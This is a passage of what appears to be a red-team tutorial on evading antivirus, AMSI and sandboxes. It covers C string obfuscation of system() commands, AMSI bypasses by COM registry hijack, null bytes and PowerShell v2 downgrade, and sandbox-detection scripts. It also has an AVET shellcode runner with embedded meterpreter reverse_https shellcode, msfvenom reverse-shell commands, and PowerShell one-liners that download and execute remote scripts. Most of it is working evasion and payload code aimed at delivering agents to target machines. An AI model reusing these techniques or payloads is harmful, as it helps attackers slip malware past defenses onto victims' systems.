`HINT: Remmenber that the above template.c was compiled using the -trigraphs GCC switch`<br />

---

      [memset + strrchr] The strrchr funtion locates the last occurrence of character in the string.
      In the follow example the token [p] inside str[] variable its the delimiter char that strrchr
      its searching for, then the new value its written in a new variable named ret[] and memset()
      funtion then prints the [10] firts tokens and delete the [3] last tokens from ret[] variable.
      
<br />

- String command to obfuscate<br />
`powershell`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main ()
          {
            char *ret;
            const char ch = 'p';
            const char str[] = "noobpowershellgie";
            printf("token[0]: %s\n", str);

              /* use token ['p'] as delimiter to del everything before delimiter */
              ret = strrchr(str, ch);
              printf("token[1]: %s\n", ret);

            /* memset to count [10] tokens in [ret] and del the last [3] chars */
            memset(ret + 10, ' ', 3*sizeof(char));
            printf("token[2]: %s\n", ret);
            return(0);
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i67.tinypic.com/2wq5ts3.png)

- Further obfuscated with the help of digraphs and another memset replacement<br />

![C obfuscation](http://i63.tinypic.com/26273ih.png)
`HINT: digraphs does not require any special GCC switch to be compiled unlike trigraphs`

---

      The next example splits the syscall(s) into two char variables, uses memset() C funtion
      to replace tokens in strings and then uses strcat() to be abble to concaternate syscall.

<br />

- String command to obfuscate<br />
`ifconfig wlan0|grep inet`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

      int main()
        {
          /* variable declarations */
          char trs[40] = "|grIp 0nUt";
          char str[40] = "if=on+ig elan0";
          printf("token[0]: %s\n", trs);
          printf("token[1]: %s\n", str);

          /* replace tokens in trs[] */
          memset(trs + 3, 'e', 1*sizeof(char));
          memset(trs + 6, 'i', 1*sizeof(char));
          memset(trs + 8, 'e', 1*sizeof(char));
          /* replace tokens in str[] */
          memset(str + 2, 'c', 1*sizeof(char));
          memset(str + 5, 'f', 1*sizeof(char));
          memset(str + 9, 'w', 1*sizeof(char));

          /* concaternate the two strings together */
          strcat(str, trs);
          printf("command : %s\n\n", str);
          /* runing command with system() funtion */
          int system(char *str);
          system(str);
        }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/far24y.png)

---

      [preprocessor] The follow screenshot will demistify the use of preprocessor (macros) inside C language
      macros technic can be used to obfuscated the system call(s) and de-obfuscate then at run time exec.

      The C preprocessor or cpp is the macro preprocessor for the C and C++ computer programming languages.
      The preprocessor provides the ability for the inclusion of header files, macro expansions, conditional
      compilation, and line control.

<br />

![C obfuscation](http://i68.tinypic.com/s474lf.jpg)

<br />

- String command to obfuscate<br />
`int main()`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>
      #define _____(i,s,o,g,r,a,m)(i##r##s##o)
      #define _ _____(m,i,n,u,a,l,s)

        int _()
         {
           printf("int main() funtion obfuscation\n");
         }


- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/33pc0ev.png)

---

      [preprocessor + trigraphs obfuscation]

<br />

- String command to obfuscate<br />
`int main()` **and** `{` **and** `}` **and** `\` **and** `#`

- String obfuscated (template.c)<br />

      ??=include <stdio.h>
      ??=include <string.h>
      ??=define _____(i,s,o,g,r,a,m)(i??=??=r??=??=s??=??=o)
      ??=define _ _____(m,i,n,u,a,l,s)

        int _()
          ??<
            printf("preprocessor and trigraphs and ??< ??= ??> obfuscation??/n");
          ??>

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack -trigraphs template.c -o finalname`

![C obfuscation](http://i67.tinypic.com/727rmh.png)

- More obfuscated: (delete withespaces + concaternation + trigraphs + var substitution)<br />

![C obfuscation](http://i68.tinypic.com/33y6mmt.png)

---

      [indexing + reorder] In this next example the attacker will split the 'pOwErShElL' syscall
      into a set of strings (token[]) before re-assemble them together in there correct order ..

<br />

- String command to obfuscate<br />
`pOwErShElL`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            const char *token[] = {"ErSh","TriP","pOw","ElL"};
              printf("token[0]                   : %s\n", token[0]);
              printf("token[1]                   : %s\n", token[1]);
              printf("token[2]                   : %s\n", token[2]);
              printf("token[3]                   : %s\n", token[3]);
              printf("concaternate all tokens    : %s%s%s%s\n", token[0], token[1], token[2], token[3]);
              printf("reorder tokens [2],[0],[3] : %s%s%s\n", token[2], token[0], token[3]);
            return 0;
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i66.tinypic.com/hs6t8x.png)

- More obfuscated: (delete withespaces + concaternation + trigraphs + var substitution + reorder)<br />

![C obfuscation](http://i65.tinypic.com/25u0gw2.png)
`HINT: Remmenber that the above template.c was compiled using the -trigraphs GCC switch`

---

      [strcpy + strcat + strtok] The next example uses strcpy + strcat + strtok + system
      C funtions to concaternate and execute our obfuscated string at runtime.

<br />

- String command to obfuscate<br />
`netstat -r`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            char comm[] = " -r";
            /* var declarations using [:,;] as delimiters */
            char str[] = "stat:rip,net";
            char token0[30], token1[30], token2[30], token3[30];
            printf("string  : stat:rip,net\n");

              /* strtok() extract tokens from str[] using delimiters [:,;] */
              strcpy(token0, strtok(str , ":"));
              strcpy(token1, strtok(NULL, ","));
              strcpy(token2, strtok(NULL, ";"));

              /* print separated tokens in screen */
              printf("token[0]: %s\n", token0);
              printf("token[1]: %s\n", token1);
              printf("token[2]: %s\n", token2);
              printf("concater: %s%s%s\n", token0, token1, token2);
              printf("reorder : %s%s%s\n\n", token2, token0, comm);

            /* concaternate string using strcat */
            strcat(token2, token0);
            strcat(token2, comm);

            /* execute command using system() */
            int system(char *token2);
            system(token2);
            return 0;
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i66.tinypic.com/219cew.png)
![C obfuscation](http://i65.tinypic.com/ofqdlw.png)

---

      [strcpy + strtok + strcat + memset + trigraphs + del spaces + system] In the next example we are
      using many of the technics described to further obfuscate the sourcecode and build our oneliner.

<br />

- String command to obfuscate<br />
`netstat -s -u`

![C obfuscation](http://i66.tinypic.com/qry8h3.png)

      HINT: the character [i] inside string, its the delimiter strtok() funtion its waiting to build tokens
      (separate string in sub-strings). Thats how tokens: stat | q-u | net | q-s are extracted from the main
      string declaration. The next step its to use strcat() funtion to concaternate and reorder the string.
      Then memset() funtion will replace the char [q] of string by a space (spaces between netstat cmd args)

![C obfuscation](http://i66.tinypic.com/xp7hoz.png)

- Obfuscate (trigraphs + del spaces + random var names) and Compile template.c<br />
`gcc -fno-stack-protector -z execstack -trigraphs template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/1z1qmxf.png)
`HINT: Remmenber that the above template.c was compiled using the -trigraphs GCC switch`

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## AMSI COM/REG Bypass

      Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
      that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.

![enigma0x3 - AMSI Bypass](http://i66.tinypic.com/mrstv9.png)
`HINT: Invoke-Expression powershell command flagging AMSI detection`<br />

---

<br />

- **AMSI** .COM Object DLL hijacking [ enigma0x3 ]

      [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
      the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
      In order to do this, there are two registry entries that need to be made:

<br />

      Windows Registry Editor Version 5.00
      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
      @="C:\\IDontExist.dll"

<br />

      When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
      non-existent COM server. This causes a load failure and prevents any scanning methods from being
      accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
      you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
      methods via its COM interface:

![enigma0x3 - AMSI Bypass](http://i67.tinypic.com/2vv6x41.png)

- **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />

![enigma0x3 - AMSI Bypass](http://i65.tinypic.com/2rpv0hv.png)

[DLL hijacking technic applied to AMSI-Bypass.bat with agent exec abilities](https://pastebin.com/H2kjLCin)<br />

---

<br /> 

- **AMSI** bypass using nul bits [Satoshi]

      Bypass AMSI mechanism using nul bits before the actual funtion occurs.
      For file contents, insert "#<NULL>" at the beginning of the file, and any places
      where additional scans with AMSI occur. For command line contents, wrap them into
      Invoke-Expression and prepend 'if(0){{{0}}}' -f $(0 -as [char]) +'

<br />

- For **command line** contents<br />

       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')

- OR (using [#NULL] before the monitorized syscall)

      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')

![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/fU7e51.jpg)


- For file contents<br />

![enigma0x3 - AMSI Bypass](http://i64.tinypic.com/15d8gsy.png)

---

- Bypass or Avoid AMSI by **version Downgrade** <br />

      Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing.
      If .Net 3.0 is available on a target Windows 10 machine (which is not default) PowerShell
      v2 can be started  with the -Version option.

<br />

![AMSI Bypass](http://i67.tinypic.com/1z6w1s2.jpg)

- Oneliner AMSI bypass<br />

      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
      

![AMSI Bypass](http://i68.tinypic.com/2hd88yg.jpg)

[AMSI Downgrade check applied to AMSI-Downgrade.ps1 (just check if vuln its present)](https://pastebin.com/qkkq5bZy)<br />

---

- Reflection - Matt Graeber's method<br />

      Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things by
      Matt, this is my favorite. It doesn't need elevated shell and there is no notification to the user.

<br />

![AMSI Bypass](http://i65.tinypic.com/15hzzvb.png)

[@mattifestation reflection technic applied to AMSI-Reflection.ps1 with Bypass/download/exec abilities](https://pastebin.com/THJQvHnU)<br />

---

- @danielbohannon **escaping percent** signs bug (EventVwr.exe)

      Daniel Bohannon disclosure a few days ago (19 march 2018) one AMSI obfuscation technic that
      relays on an escaping bug with percent signs in Sysmon EID 1's CommandLine field that is
      rendering incorrect data when viewed with EventVwr.exe.

<br />

      cmd.exe /c "echo PUT_EVIL_COMMANDS_HERE||%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1"

![powershell obfuscation](http://i.cubeupload.com/OzA5WV.jpg)
![powershell obfuscation](http://i.cubeupload.com/MpI26u.png)

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Bypass the scan engine (sandbox)

<br />

      [ detecting the sandbox environment. ] Most sandbox's are using hostnames like Sandbox,
      Maltest, Malware, malsand, ClonePC. With simple tricks like hostname, mac address or
      process detection, malware can detect if its working in an sandbox environment.
      Sandbox evasion capabilities allow malware to stay undetected during sandbox analysis.

      the next powershell script checks if we are running in a sandbox environment by
      extracting target hostname and compare it with knonw sandbox's hostnames.

<br />

      $h=hostname;if ($h -match "Sandbox" -Or $h -match "Maltest" -Or $h -match "Malware" -Or $h -match "ClonePC") {write-Host "";write-Host "SandBox : detected .." -ForeGroundColor red;write-Host "Hostname: $h" -ForeGroundColor red;}else{write-Host "";write-Host "SandBox : not detected .." -ForeGroundColor green;write-Host "Hostname: $h" -ForeGroundColor green;powershell Get-Date;Start-Sleep 3}

![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/lisJ35.png)

[sandbox-detection.ps1 demo script can be found here:](https://pastebin.com/qhgDvcrF)<br />

      Next example uses 'stalling + Onset delay' technics to bypass the sandbox environment.
      Onset delay: Malware will delay execution to avoid analysis by the sample.
      For example, a external Ping can be perform during a pre-defined time. 

      Stalling code: This technique is used for delaying execution of the real malicious code.
      Stalling code is typically executed before any malicious behavior. The attacker’s aim is
      to delay the execution of the malicious activity long enough so that an automated dynamic
      analysis system fails to extract the interesting malicious behavior. 

<br />

      $h=hostname;if ($h -match "Sandbox" -Or $h -match "Maltest" -Or $h -match "Malware" -Or $h -match "ClonePC") {write-Host "";write-Host "SandBox : detected .." -ForeGroundColor red;write-Host "Hostname: $h" -ForeGroundColor red;ping -n 6 -w 100 www.microsoft.com > $env:tmp\license.pem;powershell Get-Date;Start-Sleep 3}else{write-Host "";write-Host "SandBox : not detected .." -ForeGroundColor green;write-Host "Hostname: $h" -ForeGroundColor green;powershell Get-Date;Start-Sleep 3}

![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/TO8qsd.jpg)

---

      This next technic writes a file to disk before executing shellcode into target ram ..
      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.

<br />

![avet bypass](http://i67.tinypic.com/2chpeed.png)


<br />

**template.c** from AVET<br />

```
      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>
      #include <strsafe.h>

      void exec_mycode(unsigned char *mycode)
      {
        int (*funct)();
        funct = (int (*)()) mycode;
        (int)(*funct)();
      }


      int main (int argc, char **argv)
      {
      /*
      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
      */

      unsigned char buffer[]= 
      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
	
      /*
      Here is the bypass. A file is written, this bypasses the scan engine
      */
        HANDLE hFile;
	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
		exit(0);

	exec_mycode(buffer);
      }
```

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />

---

<br /><br /><br /><br />

## OBFUSCATING THE METASPLOIT TEMPLATE (psh-cmd)

      when we use metasploit to build shellcode, msfvenom uses pre-written templates to embebbed
      the shellcode on it, those templates contain also system calls that migth be detected by
      AMSI mechanism, to avoid that we need to decode the base64 string produced by msfvenom,
      search for the syscalls, obfuscate them, and encode the template again to base64 to be
      embebbed into Unicorn.ps1 article template (or using the default msfvenom template).

<br />

Build shellcode using msfvenom<br />
![obfuscating the template](http://i.cubeupload.com/DLjxC2.png)

Editing msfvenom template<br />
![obfuscating the template](http://i.cubeupload.com/z9bcjh.jpg)

Strip the template to extact only the base64 string (parsing data)<br />
`HINT: Deleting from template the string: %comspec% /b /c start /min powershell.exe -nop -w hidden -e`<br />
![obfuscating the template](http://i.cubeupload.com/ZtyCYd.png)

Decoding the base64 string ..<br />
`This template build by msfvenom also contains powershell syscalls that migth be flagged`<br />
![obfuscating the template](http://i.cubeupload.com/i43jmL.png)

Obfuscate the syscalls..<br />
`HINT: In this example iam only changing the letters from small to big (concaternate)`<br />
![obfuscating the template](http://i.cubeupload.com/ixIFJi.jpg)

Encodind the template again into base64 to be embebbed into unicorn.ps1 (or not)<br />
`HINT: This template only have the syscall's obfuscated, not the 1º funtion deleted [redbox in previous pic]`<br />
![obfuscating the template](http://i.cubeupload.com/AMIPyT.png)

Replace [ ENCODED-SHELLCODE-STRING ] by your new base64 string..<br />
`HINT: now your new obfuscated template its ready to be deliver to target machine`<br />
![obfuscating the template](http://i.cubeupload.com/w7CJtx.png)
`HINT: If your plans are using the msfvenom template, then remmenber to add the follow syscall (obfuscate it)`<br />
`HINT: in the beggining of the template: %comspec% /b /c start /min powershell.exe -noP -wIn hIdDEn -en`<br />


- Final Notes:<br />
there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can help us in discovering what flags are beeing detected in our shellcode ..<br />Adicionally we can also obfuscated the meterpreter loader using arno0x0x random bytes stager [here](https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/)<br />


[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## C to ANCII Obfuscation (c-ancii)

- Encoding shellcode from **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode

---

- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')

      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt

- **Parsing** shellcode data (from C to ANCII)

      # store parsed data into '$store' bash local variable
      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`

- **template.c** to be injected with generated shellcode

      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>

      void exec_mycode(unsigned char *mycode)
      {
      int (*funct)();
         funct = (int (*)()) mycode;
         (int)(*funct)();
      }

      // return pointer to mycode
      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
      {
      int j=0;
         mycode=malloc((size/2));
         int i=0;
      do
      {
      unsigned char temp[3]={0};
         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
         mycode[j] = strtoul(temp, NULL, 16);
         i+=2;
         j++;
      } while(i<size);
         return mycode;
      }
         int main (int argc, char **argv)
      {
         unsigned char *mycode;

      unsigned char buffer[]=
      "INSERT_SHELLCODE_HERE";

      int size = sizeof(buffer);
         mycode = decode_mycode(buffer,mycode,size);
         exec_mycode(mycode);
      }


<br />

- **Inject** parsed shellcode into **template.c**

      # inject shellcode into template.c using SED bash command
      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c


- Compile template.c with **GCC** software to **.exe**

      gcc.exe template.c -o agent.exe

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

---

## FINAL NOTES - REMARKS

      90% of the obfuscation technics in the 'powershell' section contained in this article are
      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.

      Also keep in mind of the most common obfuscations technics like write a file on disk before
      executing any malicious actions (agent execution) or execute obscure funtions, replace any
      main functions (and syscall's) by base64 encoded variables/funtions, and store them inside
      your script (agent) to be called at run-time, also remmenber to use 'Rubish Data' piped (|)
      before your system call's and the last but not least, Tick,Concatenate/splatting all function
      names also to use big and small letters (eg: P`o"W"e^Rs%!h%E^l%0D%L"."e^%i0:~14,1%^E) since
      microsoft's interpreters are not case sensitive (powershell and cmd).

      Less used powershell parameters: powershell.exe -noP -Win hidden -ep ByPass -nonI -en
      check the full list in Referencies URL link [5] http://www.danielbohannon.com/blog-1/
      2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier

      Its never to late to remmenber that diferent technics can be combined together to achieve
      better results. The next example shows one powershell (psh-cmd) payload embbebed into one
      template.bat using 5 diferent batch obfuscation technics found in this article (only batch)

<br />

- demo.bat

      DE-OBFUSCATED : cmd.exe /c powershell.exe -noP -WIn hIdDen -ep bYPaSs -en $ENCODED-SHELLCODE-STRING
      OBFUSCATED    : @c^M%k8%.E"x"%!h% /c =%db%oW%!h%rS^h%!h%lL"."%!h%Xe -%U7%o%db% -W^I%U7% hI%k8%D%!h%%U7% -%!h%p By%db%a^S%AA%s -%!h%%U7% $ENCODED-SHELLCODE-STRING

- demo.bat
![Final notes](http://i65.tinypic.com/20f47xk.png)<br />


- Scripts used in this article (**POCs**):<br />
[1] [undefined-vars.bat](https://pastebin.com/MV0uxDaf) [2] [certutil-dropper.bat](https://pastebin.com/hyBJHAgx) [3] [demo.bat](https://pastebin.com/8KL6rBTF) [4] [AMSI-bypass.bat](https://pastebin.com/H2kjLCin) [5] [Hello.ps1](https://pastebin.com/ELByB5y7) [6] [Unicorn.ps1](https://pastebin.com/y9qJdGJf)<br />[7] [psh-dropper.ps1](https://pastebin.com/MJ2f20Zs) [8] [BitsTransfer.ps1](https://pastebin.com/keaHme3F) [9] [Invoke-WebRequest.ps1](https://pastebin.com/9VRtFZ1Y) [10] [AMSI-Downgrade.ps1](https://pastebin.com/qkkq5bZy)<br />[11] [AMSI-Reflection.ps1](https://pastebin.com/THJQvHnU) [12] [Bypass-AMSI.ps1](https://pastebin.com/A2C0TSNs) [13] [AgentK.bat](https://pastebin.com/K2w5dbuQ) [14] [sandbox-detection.ps1](https://pastebin.com/qhgDvcrF) [15] [exec.vbs](https://pastebin.com/cxfyQfwT)<br />

      The above scripts are meant for article readers to quick test concepts and obfuscation methods
      there is no guaranties that they will bypass AMSI detection [demo scripts] so.. if you are a
      scriptkiddie wanting to have scripts to use, dont.. they are examples .. use what you have
      learned and apply it to your projects ..

---

      Article Reward technic [ re-obfuscation-encoding ] by: r00t-3xp10it
      This technic can be used in cmd.exe | bash or powershell.exe interpreter, but this example
      its written to describe the technic under powershell interpreter (terminal or script.ps1).

<br />

- String command to obfuscate<br />
`Get-WmiObject`

- Tick String to be transformed into base64<br />

      G`et-Wm`iOb`ject

<br />

      1º - Take one obfuscated command and store it into $encode variable
           [String]$encode="G`et-Wm`iOb`ject"   #<-- Use allway an impar number of ` special characters

      2º - Encode the $encode var into a base64 string and store it into $encodeString var
           $encodeString=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encode))

      3ª - Display/Copy the reObfuscated base64 string
           Write-Host "Encoded syscall:" $encodeString -ForeGroundColor Green -BackGroundColor black

![powershell obfuscation](http://i63.tinypic.com/wvtlxu.jpg)


<br />

      4º - Add the follow lines to your script.ps1
           $rebOfuscation = "R2VOLVdtaU9iamVjdA=="
           $syscall=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reObfuscation))
           powershell.exe $syscall -Class Win32_ComputerSystem  #<-- decode the syscall at run-time.

![powershell obfuscation](http://i66.tinypic.com/351cq2w.jpg)

---

### Special thanks
**@danielbohannon** **@AndyGreen** **@enigma0x3** **@ReL1k**<br />
**@404death** **@daniel sauder (avet)** **@Wandoelmo Silva** and<br />
**@Muhammad Samaak <-- for is contributions to this project ^_^**<br />
**@Shanty Damayanti <-- My geek wife for all the misspelling fixes <3**<br />

<br />

### Referencies
[0] [This Article Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />
[2] [danielbohannon - invoke-obfuscation-v11-release](http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9)<br />
[3] [danielbohannon - Invoke-obfuscation Techniques how-to](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
[4] [varonis - powershell-obfuscation-stealth-through-confusion](https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/)<br />
[5] [danielbohannon - powershell-execution-argument-obfuscation](http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier)<br />
[6] [paloaltonetworks - pulling-back-the-curtains-on-encodedcommand-powershell](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)<br />
[7] [enigma0x3 - bypassing-amsi-via-com-server-hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/)<br />
[8] [ReL1k - circumventing-encodedcommand-detection-powershell](https://www.trustedsec.com/2017/01/circumventing-encodedcommand-detection-powershell/)<br />
[9] [Satoshi Tanda - amsi-bypass-with-null-character](http://standa-note.blogspot.pt/2018/02/amsi-bypass-with-null-character.html)<br />
[10] [sandbox-evasion-technics](http://unprotect.tdgt.org/index.php/Sandbox_Evasion)<br />
[11] [C String Obfuscation](https://fresh2refresh.com/c-programming/c-strings/c-strncat-function/)<br />
[12] [Weirdest obfuscated “Hello World!”](https://codegolf.stackexchange.com/questions/22533/weirdest-obfuscated-hello-world)<br />

<br />

## Author: r00t-3xp10it
# Suspicious Shell Activity (red team) @2018
